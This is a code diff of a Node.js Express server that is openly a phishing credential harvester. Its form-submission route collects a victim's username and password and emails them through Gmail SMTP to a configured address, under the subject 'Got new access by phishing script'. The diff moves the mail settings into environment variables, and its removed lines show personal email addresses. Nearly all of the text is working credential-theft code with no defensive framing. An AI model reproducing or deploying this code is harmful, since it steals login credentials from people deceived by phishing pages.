@@ -1,38 +1,43 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const nodemailer = require('nodemailer');
+require('dotenv').config();
+
 
 const app = express();
-const port = 8000
+const port = process.env.PORT || 8000;
 
-// Parse URL-encoded bodies (as sent by HTML forms)
 app.use(bodyParser.urlencoded({ extended: true }));
-
-// Parse JSON bodies (as sent by API clients)
 app.use(bodyParser.json());
 
-app.get('/test', (req, res) => {
-    return res.redirect('https://www.google.com')
-})
-// Handle form submission
 app.post('/submit-form', (req, res) => {
     const { username, password } = req.body;
- 
- kk   if (!username || !password) {
+    if (!username || !password) {
         return res.status(400).send('Username and password are required');
     }
 
     const transporter = nodemailer.createTransport({
-        service: 'gmail',
+        service: "Gmail",
+        host: "smtp.gmail.com",
+        port: 465,
+        secure: false,
         auth: {
-            user: 'your-email@gmail.com', // Your Gmail email address
-            pass: 'your-password' // Your Gmail password (not recommended for production)
+            user: process.env.EMAIL_USER,
+            pass: process.env.EMAIL_PASS
         }
     });
 
+    transporter.verify(function (error, success) {
+        if (error) {
+          console.log(error);
+        } else {
+          console.log("Server is ready to take our messages");
+        }
+      });
+
     const mailOptions = {
-        from: 'rajivary1@gmail.com',
-        to: 'aryalrajiv1@gmail.com', // Recipient's email address
+        from: process.env.EMAIL_USER,
+        to: process.env.EMAIL_TO,
         subject: 'Got new access by phishing script',
         text: `The username is ${username} and password is ${password}`
     };
